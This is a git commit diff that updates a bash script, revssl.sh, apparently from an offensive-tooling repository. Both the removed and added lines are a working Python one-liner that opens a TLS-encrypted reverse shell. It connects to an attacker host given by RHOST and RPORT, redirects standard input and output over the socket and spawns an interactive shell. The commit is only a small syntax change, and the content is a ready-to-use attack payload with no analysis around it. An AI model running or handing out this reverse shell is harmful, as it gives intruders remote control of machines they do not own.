749eb62d5f93a0a7b181381968048fb8cea5e6b4
Lupin <36815504+Roni-Carta@users.noreply.github.com>
2021-10-21 11:03:13 +0200

    Update revssl.sh

--- revssl.sh
+++ revssl.sh
@@ -1,3 +1,3 @@
 #!/bin/bash
 
-python3 -c 'import ssl,sys,socket,os,pty;s=ssl.wrap_socket(socket.socket(),ssl_version=ssl.PROTOCOL_TLSv1,ciphers="ADH-AES256-SHA");s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
+python3 -c 'import ssl,sys,socket,os,pty;s=ssl.wrap_socket(socket.socket(socket.AF_INET,socket.SOCK_STREAM),ssl_version=ssl.PROTOCOL_TLSv1,ciphers="ADH-AES256-SHA");s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'
